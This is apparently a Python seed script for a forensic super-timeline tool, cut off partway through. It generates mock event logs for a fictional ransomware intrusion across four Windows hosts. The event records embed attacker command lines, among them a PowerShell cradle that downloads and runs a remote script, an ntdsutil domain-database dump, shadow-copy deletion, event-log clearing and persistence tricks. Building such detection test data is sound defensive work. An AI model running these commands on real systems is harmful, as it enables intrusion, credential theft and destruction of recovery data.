#!/usr/bin/env python3
"""Seed mock data for Super Timeline feature testing.

Creates a realistic "CORAL REEF" ransomware incident across 4 hosts,
writes per-host timeline.jsonl files, and invokes the super timeline
background service to merge them and run lateral movement detection.

Usage:
    python seed-super-timeline-mock.py [--base-path /vault/evidence] [--clean]

Options:
    --base-path PATH    Evidence storage path
                        (default: env EVIDENCE_STORAGE_PATH or /vault/evidence)
    --clean             Delete existing mock incident records before re-seeding
"""
from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
from datetime import datetime, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# Path bootstrap — must happen before any app imports
# ---------------------------------------------------------------------------
ROOT = Path(__file__).resolve().parents[2]
BACKEND_PATH = ROOT / "backend"
sys.path.insert(0, str(BACKEND_PATH))

from sqlalchemy import select  # noqa: E402

from app.db.session import AsyncSessionLocal  # noqa: E402
from app.models.collector import Collector  # noqa: E402
from app.models.device import Device  # noqa: E402
from app.models.evidence import EvidenceFolder  # noqa: E402
from app.models.incident import Incident  # noqa: E402
from app.models.job import Job  # noqa: E402
from app.models.processing import ProcessingJob  # noqa: E402
from app.services.super_timeline_service import build_super_timeline_background  # noqa: E402

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
INCIDENT_ID = "INC-MOCK-SUPERTL"
NOW_STR = datetime.now(timezone.utc).isoformat()

HOSTS = [
    {
        "device_id": "DEVICE-WS01",
        "hostname": "WORKSTATION-01",
        "ip_address": "192.168.1.50",
        "type": "workstation",
        "job_id": "job-mock-ws01",
        "proc_job_id": "proc-job-mock-ws01",
    },
    {
        "device_id": "DEVICE-DC01",
        "hostname": "DC01",
        "ip_address": "192.168.1.10",
        "type": "server",
        "job_id": "job-mock-dc01",
        "proc_job_id": "proc-job-mock-dc01",
    },
    {
        "device_id": "DEVICE-FS02",
        "hostname": "FILESERVER-02",
        "ip_address": "192.168.1.20",
        "type": "server",
        "job_id": "job-mock-fs02",
        "proc_job_id": "proc-job-mock-fs02",
    },
    {
        "device_id": "DEVICE-HR03",
        "hostname": "LAPTOP-HR03",
        "ip_address": "192.168.1.75",
        "type": "laptop",
        "job_id": "job-mock-hr03",
        "proc_job_id": "proc-job-mock-hr03",
    },
]

# Extra "online" devices not linked to the incident (populate Devices page / Dashboard stats)
EXTRA_DEVICES = [
    {
        "device_id": "DEVICE-OBS01",
        "hostname": "WORKSTATION-02",
        "ip_address": "192.168.1.51",
        "type": "workstation",
        "os": "windows",
    },
    {
        "device_id": "DEVICE-OBS02",
        "hostname": "MAILSERVER-01",
        "ip_address": "192.168.1.15",
        "type": "server",
        "os": "linux",
    },
    {
        "device_id": "DEVICE-OBS03",
        "hostname": "LAPTOP-DEV01",
        "ip_address": "192.168.1.80",
        "type": "laptop",
        "os": "windows",
    },
]

# Mock collectors (show on Dashboard "COLLECTORS ONLINE" stat)
MOCK_COLLECTORS = [
    {
        "id": "COLLECTOR-ALPHA",
        "name": "ALPHA-NODE",
        "endpoint": "http://192.168.1.200:8080",
        "status": "ONLINE",
    },
    {
        "id": "COLLECTOR-BETA",
        "name": "BETA-NODE",
        "endpoint": "http://192.168.1.201:8080",
        "status": "ONLINE",
    },
]

# Evidence folders — one per host job (populate Dashboard "Evidence Files" count)
EVIDENCE_FOLDERS = [
    {
        "id": f"evfolder-mock-{h['job_id']}",
        "incident_id": INCIDENT_ID,
        "type": "collection",
        "files_count": fc,
        "total_size": ts,
        "status": "locked",
    }
    for h, fc, ts in zip(
        HOSTS,
        [312, 289, 347, 198],
        ["1.2 GB", "980 MB", "1.5 GB", "650 MB"],
    )
]


# ---------------------------------------------------------------------------
# Event generators
# ---------------------------------------------------------------------------


def make_events_workstation01() -> list[dict]:
    """Return ~25 realistic timeline events for WORKSTATION-01.

    Covers the initial compromise: phishing email, Office macro, credential
    dumping, lateral movement staging, and ransomware execution.
    """
    return [
        {
            "datetime": "2026-01-15T07:52:11Z",
            "timestamp_desc": "LAST ACCESSED",
            "message": "LNK file opened: Invoice_Q4_2025.docx.lnk — User jsmith opened phishing email attachment via Outlook",
            "source": "LNK",
            "source_short": "LNK",
            "user": "jsmith",
            "lnk_target": r"C:\Users\jsmith\Downloads\Invoice_Q4_2025.docx",
            "working_dir": r"C:\Users\jsmith\Downloads",
            "machine_id": "WORKSTATION-01",
        },
        {
            "datetime": "2026-01-15T07:53:04Z",
            "timestamp_desc": "LAST ACCESSED",
            "message": "LNK file accessed: WINWORD.EXE — Microsoft Word launched to open attachment",
            "source": "LNK",
            "source_short": "LNK",
            "user": "jsmith",
            "lnk_target": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "machine_id": "WORKSTATION-01",
        },
        {
            "datetime": "2026-01-15T08:03:17Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: WINWORD.EXE spawned cmd.exe — Office macro execution detected. TargetUserName: jsmith CommandLine: cmd.exe /c powershell -w hidden",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "parent_process": "WINWORD.EXE",
            "process_name": "cmd.exe",
            "command_line": "cmd.exe /c powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.55/stage2.ps1')",
            "logon_id": "0x3E7",
        },
        {
            "datetime": "2026-01-15T08:23:41Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: powershell.exe download cradle — remote stager retrieved from C2. TargetUserName: jsmith",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "parent_process": "cmd.exe",
            "process_name": "powershell.exe",
            "command_line": "powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.55/stage2.ps1')",
            "logon_id": "0x3E7",
        },
        {
            "datetime": "2026-01-15T08:23:44Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Prefetch: powershell.exe executed — run_count=4, last_run=2026-01-15T08:23:44Z",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "powershell.exe",
            "run_count": 4,
            "prefetch_hash": "A1B2C3D4",
            "volume_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
        },
        {
            "datetime": "2026-01-15T08:24:02Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Chainsaw Sigma rule triggered: Credential Dump via LSASS — LSASS process memory read access by powershell.exe. rule_name=Credential Dump via LSASS rule_level=critical",
            "source": "Chainsaw Sigma",
            "source_short": "SIGMA",
            "rule_name": "Credential Dump via LSASS",
            "rule_level": "critical",
            "rule_id": "61d29caf-6c15-4d7b-9991-b9ac43f35bd8",
            "process_name": "powershell.exe",
            "target_process": "lsass.exe",
            "access_mask": "0x1FFFFF",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T08:25:03Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Users\jsmith\AppData\Local\Temp\mimikatz.exe (1045504 bytes)",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\jsmith\AppData\Local\Temp\mimikatz.exe",
            "file_size": 1045504,
            "mft_entry": 184732,
            "sequence_number": 3,
            "si_created": "2026-01-15T08:25:03Z",
            "fn_created": "2026-01-15T08:25:03Z",
        },
        {
            "datetime": "2026-01-15T08:26:15Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: mimikatz.exe executed — run_count=1, path=C:\Users\jsmith\AppData\Local\Temp\mimikatz.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "mimikatz.exe",
            "run_count": 1,
            "prefetch_hash": "DEADBEEF",
            "volume_path": "C:\\Users\\jsmith\\AppData\\Local\\Temp",
        },
        {
            "datetime": "2026-01-15T08:28:33Z",
            "timestamp_desc": "LAST MODIFIED",
            "message": "Registry key accessed: HKLM\\SAM\\SAM\\Domains\\Account — SAM hive read by SYSTEM process (mimikatz token impersonation)",
            "source": "SYSTEM.evtx",
            "source_short": "REGISTRY",
            "event_id": 4657,
            "registry_key": r"HKLM\SAM\SAM\Domains\Account",
            "object_name": r"HKLM\SAM",
            "access_mask": "0x20019",
            "process_name": "mimikatz.exe",
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T08:30:05Z",
            "timestamp_desc": "WRITTEN",
            "message": r"Registry run key persistence added: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SvcHostHelper — value points to C:\Users\jsmith\AppData\Roaming\svchost_helper.exe",
            "source": "NTUSER.DAT",
            "source_short": "REGISTRY",
            "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "value_name": "SvcHostHelper",
            "value_data": r"C:\Users\jsmith\AppData\Roaming\svchost_helper.exe",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T08:33:22Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: schtasks.exe scheduled task created — persistence mechanism established. TargetUserName: jsmith",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "process_name": "schtasks.exe",
            "command_line": r"schtasks /create /tn \Microsoft\Windows\Update\SvcHostUpdate /tr C:\Users\jsmith\AppData\Roaming\svchost_helper.exe /sc daily /st 09:00",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T08:35:47Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Windows\Temp\psexec.exe (576512 bytes)",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Windows\Temp\psexec.exe",
            "file_size": 576512,
            "mft_entry": 184801,
            "sequence_number": 1,
            "si_created": "2026-01-15T08:35:47Z",
            "fn_created": "2026-01-15T08:35:47Z",
        },
        {
            "datetime": "2026-01-15T08:40:11Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Sysmon EventID 3 — Outbound network connection established: powershell.exe -> 192.168.1.10:445 (SMB to DC01)",
            "source": "Sysmon",
            "source_short": "SYSMON",
            "event_id": 3,
            "process_name": "powershell.exe",
            "src_ip": "192.168.1.50",
            "src_port": 49823,
            "dst_ip": "192.168.1.10",
            "dst_port": 445,
            "protocol": "TCP",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T08:42:03Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: psexec.exe executed against DC01 — run_count=2, path=C:\Windows\Temp\psexec.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "psexec.exe",
            "run_count": 2,
            "prefetch_hash": "B3C4D5E6",
            "volume_path": "C:\\Windows\\Temp",
        },
        {
            "datetime": "2026-01-15T08:43:01Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: cmd.exe launched via psexec — remote command execution on DC01 initiated. TargetUserName: jsmith",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "process_name": "cmd.exe",
            "parent_process": "psexec.exe",
            "command_line": r"cmd.exe /c whoami && net group ""Domain Admins"" /domain",
            "logon_id": "0x4F3A1",
        },
        {
            "datetime": "2026-01-15T09:00:14Z",
            "timestamp_desc": "WRITTEN",
            "message": r"Registry: HKLM\SYSTEM\CurrentControlSet\Services\PSEXESVC installed as service — psexec service key written",
            "source": "SYSTEM.evtx",
            "source_short": "REGISTRY",
            "event_id": 4697,
            "registry_key": r"HKLM\SYSTEM\CurrentControlSet\Services\PSEXESVC",
            "service_name": "PSEXESVC",
            "service_type": "WIN32_OWN_PROCESS",
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T09:50:22Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Windows\Temp\coral_reef_ransom.exe (2097152 bytes)",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Windows\Temp\coral_reef_ransom.exe",
            "file_size": 2097152,
            "mft_entry": 185244,
            "sequence_number": 1,
            "si_created": "2026-01-15T09:50:22Z",
            "fn_created": "2026-01-15T09:50:22Z",
        },
        {
            "datetime": "2026-01-15T10:00:05Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Process created: coral_reef_ransom.exe — ransomware payload detonated. TargetUserName: SYSTEM",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "coral_reef_ransom.exe",
            "parent_process": "cmd.exe",
            "command_line": r"C:\Windows\Temp\coral_reef_ransom.exe --encrypt-all --ransom-note HOW_TO_DECRYPT.txt",
            "logon_id": "0x3E7",
        },
        {
            "datetime": "2026-01-15T10:00:08Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: coral_reef_ransom.exe executed — run_count=1, path=C:\Windows\Temp\coral_reef_ransom.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "coral_reef_ransom.exe",
            "run_count": 1,
            "prefetch_hash": "CAFEBABE",
            "volume_path": "C:\\Windows\\Temp",
        },
        {
            "datetime": "2026-01-15T10:02:17Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — C:\Users\jsmith\Documents\Q4_Budget.xlsx -> Q4_Budget.xlsx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\jsmith\Documents\Q4_Budget.xlsx.LOCKED",
            "original_name": "Q4_Budget.xlsx",
            "mft_entry": 121034,
            "sequence_number": 7,
        },
        {
            "datetime": "2026-01-15T10:02:19Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — C:\Users\jsmith\Documents\Acquisition_Plan.docx -> Acquisition_Plan.docx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\jsmith\Documents\Acquisition_Plan.docx.LOCKED",
            "original_name": "Acquisition_Plan.docx",
            "mft_entry": 121089,
            "sequence_number": 4,
        },
        {
            "datetime": "2026-01-15T10:02:21Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — C:\Users\jsmith\Desktop\Client_Contracts.xlsx -> Client_Contracts.xlsx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\jsmith\Desktop\Client_Contracts.xlsx.LOCKED",
            "original_name": "Client_Contracts.xlsx",
            "mft_entry": 99201,
            "sequence_number": 12,
        },
        {
            "datetime": "2026-01-15T10:05:33Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Users\jsmith\Desktop\HOW_TO_DECRYPT.txt (2048 bytes) — ransom note dropped",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\jsmith\Desktop\HOW_TO_DECRYPT.txt",
            "file_size": 2048,
            "mft_entry": 185500,
            "sequence_number": 1,
        },
        {
            "datetime": "2026-01-15T10:07:45Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: vssadmin.exe delete shadows — shadow copy deletion attempted to prevent recovery. TargetUserName: SYSTEM",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "vssadmin.exe",
            "command_line": "vssadmin delete shadows /all /quiet",
            "parent_process": "coral_reef_ransom.exe",
        },
        {
            "datetime": "2026-01-15T10:08:02Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "AmCache: coral_reef_ransom.exe first execution record — SHA1=da39a3ee5e6b4b0d3255bfef95601890afd80709, publisher=None (unsigned)",
            "source": "AmCache",
            "source_short": "AMCACHE",
            "process_name": "coral_reef_ransom.exe",
            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
            "file_path": r"C:\Windows\Temp\coral_reef_ransom.exe",
            "publisher": None,
            "signed": False,
        },
    ]


def make_events_dc01() -> list[dict]:
    """Return ~25 realistic timeline events for DC01.

    Covers lateral movement via psexec, domain enumeration, NTDS access,
    persistence via scheduled tasks, and ransomware execution.
    """
    return [
        {
            "datetime": "2026-01-15T08:44:03Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Logon success: TargetUserName: jsmith — Type 3 network logon from WORKSTATION-01 (192.168.1.50) via psexec",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4624,
            "user": "jsmith",
            "LogonType": 3,
            "src_ip": "192.168.1.50",
            "src_workstation": "WORKSTATION-01",
            "logon_id": "0x9F3A4",
            "auth_package": "NTLM",
        },
        {
            "datetime": "2026-01-15T08:45:11Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Service installed: PSEXESVC — psexec service registered on DC01. ServiceName=PSEXESVC ImagePath=C:\\Windows\\PSEXESVC.exe",
            "source": "SYSTEM.evtx",
            "source_short": "EVTX",
            "event_id": 7045,
            "service_name": "PSEXESVC",
            "image_path": r"C:\Windows\PSEXESVC.exe",
            "start_type": "DEMAND_START",
            "account": "LocalSystem",
        },
        {
            "datetime": "2026-01-15T08:46:07Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: psexec.exe executed on DC01 — run_count=3, path=C:\Windows\PSEXESVC.exe (lateral movement from WORKSTATION-01)",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "psexec.exe",
            "run_count": 3,
            "prefetch_hash": "B3C4D5E6",
            "volume_path": "C:\\Windows",
        },
        {
            "datetime": "2026-01-15T08:47:22Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Admin share accessed: \\\\DC01\\ADMIN$ — network share access from WORKSTATION-01 (192.168.1.50). ShareName=ADMIN$",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 5140,
            "user": "jsmith",
            "share_name": r"\\DC01\ADMIN$",
            "src_ip": "192.168.1.50",
            "access_mask": "0x1",
        },
        {
            "datetime": "2026-01-15T08:50:44Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Logon success: TargetUserName: jsmith — second network session from WORKSTATION-01 (192.168.1.50) LogonType=3",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4624,
            "user": "jsmith",
            "LogonType": 3,
            "src_ip": "192.168.1.50",
            "src_workstation": "WORKSTATION-01",
            "logon_id": "0xA12BC",
            "auth_package": "Kerberos",
        },
        {
            "datetime": "2026-01-15T08:55:03Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: net.exe — domain admin group enumeration. TargetUserName: jsmith CommandLine: net group \"Domain Admins\" /domain",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "process_name": "net.exe",
            "command_line": 'net group "Domain Admins" /domain',
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T08:57:18Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: net.exe — domain user enumeration. TargetUserName: jsmith CommandLine: net user /domain",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "process_name": "net.exe",
            "command_line": "net user /domain",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T09:05:41Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Sysmon EventID 3 — Outbound SMB connection: cmd.exe -> 192.168.1.20:445 (FILESERVER-02) for lateral movement",
            "source": "Sysmon",
            "source_short": "SYSMON",
            "event_id": 3,
            "process_name": "cmd.exe",
            "src_ip": "192.168.1.10",
            "src_port": 50122,
            "dst_ip": "192.168.1.20",
            "dst_port": 445,
            "protocol": "TCP",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T09:10:03Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Logon success: TargetUserName: jsmith — network logon on FILESERVER-02 from DC01 (192.168.1.10) LogonType=3",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4624,
            "user": "jsmith",
            "LogonType": 3,
            "src_ip": "192.168.1.10",
            "src_workstation": "DC01",
            "logon_id": "0xB44DE",
            "auth_package": "Kerberos",
        },
        {
            "datetime": "2026-01-15T09:18:09Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Logon success: TargetUserName: jsmith — network logon on LAPTOP-HR03 from DC01 (192.168.1.10) LogonType=3",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4624,
            "user": "jsmith",
            "LogonType": 3,
            "src_ip": "192.168.1.10",
            "src_workstation": "DC01",
            "logon_id": "0xC55EF",
            "auth_package": "Kerberos",
        },
        {
            "datetime": "2026-01-15T09:30:17Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Scheduled task created: \\Microsoft\\Windows\\Update\\SvcHostUpdate — persistence mechanism. TargetUserName: jsmith",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4698,
            "user": "jsmith",
            "task_name": r"\Microsoft\Windows\Update\SvcHostUpdate",
            "task_action": r"C:\Windows\Temp\coral_reef_ransom.exe",
            "trigger": "DAILY",
        },
        {
            "datetime": "2026-01-15T09:35:52Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "File object access: C:\\Windows\\NTDS\\ntds.dit — Active Directory database accessed by SYSTEM (ntdsutil/vss)",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4663,
            "user": "SYSTEM",
            "object_name": r"C:\Windows\NTDS\ntds.dit",
            "process_name": "ntdsutil.exe",
            "access_mask": "0x10000",
        },
        {
            "datetime": "2026-01-15T09:38:04Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: ntdsutil.exe — AD database dump attempt. TargetUserName: SYSTEM",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "ntdsutil.exe",
            "command_line": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_dump\" q q",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T09:42:33Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Hayabusa detection: WMI event subscription created — persistence via WMI ActiveScriptEventConsumer. Severity=high",
            "source": "Hayabusa",
            "source_short": "SIGMA",
            "rule_name": "WMI Event Subscription Persistence",
            "rule_level": "high",
            "consumer_name": "SCM Event Log Consumer",
            "filter_name": "SCM Event Log Filter",
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T09:50:08Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Windows\Temp\coral_reef_ransom.exe (2097152 bytes) — ransomware staged on DC01",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Windows\Temp\coral_reef_ransom.exe",
            "file_size": 2097152,
            "mft_entry": 234711,
            "sequence_number": 1,
            "si_created": "2026-01-15T09:50:08Z",
        },
        {
            "datetime": "2026-01-15T10:00:01Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Process created: coral_reef_ransom.exe — ransomware detonated on DC01. TargetUserName: SYSTEM",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "coral_reef_ransom.exe",
            "command_line": r"C:\Windows\Temp\coral_reef_ransom.exe --encrypt-all --ransom-note HOW_TO_DECRYPT.txt",
            "parent_process": "svchost.exe",
        },
        {
            "datetime": "2026-01-15T10:00:04Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: coral_reef_ransom.exe executed on DC01 — run_count=1, path=C:\Windows\Temp\coral_reef_ransom.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "coral_reef_ransom.exe",
            "run_count": 1,
            "prefetch_hash": "CAFEBABE",
            "volume_path": "C:\\Windows\\Temp",
        },
        {
            "datetime": "2026-01-15T10:15:22Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: vssadmin.exe — VSS shadow copy deletion on DC01. TargetUserName: SYSTEM CommandLine: vssadmin delete shadows /all /quiet",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "vssadmin.exe",
            "command_line": "vssadmin delete shadows /all /quiet",
            "parent_process": "coral_reef_ransom.exe",
        },
        {
            "datetime": "2026-01-15T10:15:25Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Chainsaw Sigma triggered: Shadow Copy Deletion — vssadmin delete shadows detected. rule_name=Shadow Copy Deletion rule_level=critical",
            "source": "Chainsaw Sigma",
            "source_short": "SIGMA",
            "rule_name": "Shadow Copy Deletion",
            "rule_level": "critical",
            "rule_id": "c947b146-0abc-4c87-bc6a-9b65f8cf7f9a",
            "process_name": "vssadmin.exe",
            "command_line": "vssadmin delete shadows /all /quiet",
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T10:20:11Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: wevtutil.exe — Security event log cleared on DC01. TargetUserName: SYSTEM CommandLine: wevtutil.exe cl Security",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "wevtutil.exe",
            "command_line": "wevtutil.exe cl Security",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T10:20:14Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Hayabusa detection: Windows Security Event Log Cleared — wevtutil.exe cl Security. Severity=high",
            "source": "Hayabusa",
            "source_short": "SIGMA",
            "rule_name": "Windows Security Event Log Cleared",
            "rule_level": "high",
            "rule_id": "a62b37e0-45d3-48d9-a517-90c1a1b0a0b8",
            "process_name": "wevtutil.exe",
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T10:22:07Z",
            "timestamp_desc": "WRITTEN",
            "message": r"Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe — Debugger key set (AV/task manager bypass)",
            "source": "SYSTEM.evtx",
            "source_short": "REGISTRY",
            "event_id": 4657,
            "registry_key": r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe",
            "value_name": "Debugger",
            "value_data": r"C:\Windows\Temp\coral_reef_ransom.exe",
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T10:25:33Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Windows\NTDS\HOW_TO_DECRYPT.txt — ransom note in NTDS directory",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Windows\NTDS\HOW_TO_DECRYPT.txt",
            "file_size": 2048,
            "mft_entry": 236001,
            "sequence_number": 1,
        },
        {
            "datetime": "2026-01-15T10:28:44Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: wevtutil.exe — Application event log cleared. TargetUserName: SYSTEM CommandLine: wevtutil.exe cl Application",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "wevtutil.exe",
            "command_line": "wevtutil.exe cl Application",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T10:30:01Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Hayabusa detection: Ransomware File Extension Rename Detected — mass .LOCKED extension renaming across DC01 shares. Severity=critical",
            "source": "Hayabusa",
            "source_short": "SIGMA",
            "rule_name": "Ransomware File Extension Rename Detected",
            "rule_level": "critical",
            "rule_id": "e4a1b3c2-d5f6-7890-abcd-ef1234567890",
            "process_name": "coral_reef_ransom.exe",
            "user": "SYSTEM",
            "affected_extensions": ".LOCKED",
            "file_count_estimate": 1847,
        },
    ]


def make_events_fileserver02() -> list[dict]:
    """Return ~25 realistic timeline events for FILESERVER-02.

    Covers lateral movement arrival, data staging, exfiltration, and
    ransomware encryption of HR and Finance shared drives.
    """
    return [
        {
            "datetime": "2026-01-15T09:10:03Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Logon success: TargetUserName: jsmith — network logon from DC01 (192.168.1.10) LogonType=3, lateral movement pivot",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4624,
            "user": "jsmith",
            "LogonType": 3,
            "src_ip": "192.168.1.10",
            "src_workstation": "DC01",
            "logon_id": "0xD66F0",
            "auth_package": "Kerberos",
        },
        {
            "datetime": "2026-01-15T09:12:27Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: Robocopy.exe executed — bulk copy of file shares initiated, run_count=1, path=C:\Windows\System32\Robocopy.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "Robocopy.exe",
            "run_count": 1,
            "prefetch_hash": "F1E2D3C4",
            "volume_path": "C:\\Windows\\System32",
        },
        {
            "datetime": "2026-01-15T09:12:31Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Process created: Robocopy.exe — bulk file staging from shared drives. TargetUserName: jsmith CommandLine: robocopy \\FILESERVER-02\HR C:\Staging\HR /E /Z /MT:32",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "process_name": "Robocopy.exe",
            "command_line": r"robocopy \\FILESERVER-02\HR C:\Staging\HR /E /Z /MT:32",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T09:14:03Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: 7z.exe executed — archive creation for data exfiltration staging, run_count=1, path=C:\Program Files\7-Zip\7z.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "7z.exe",
            "run_count": 1,
            "prefetch_hash": "A2B3C4D5",
            "volume_path": "C:\\Program Files\\7-Zip",
        },
        {
            "datetime": "2026-01-15T09:14:08Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Process created: 7z.exe — creating compressed archive of staged data. TargetUserName: jsmith CommandLine: 7z.exe a -tzip C:\Windows\Temp\staging.zip C:\Staging\* -p""coral_reef_2026""",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
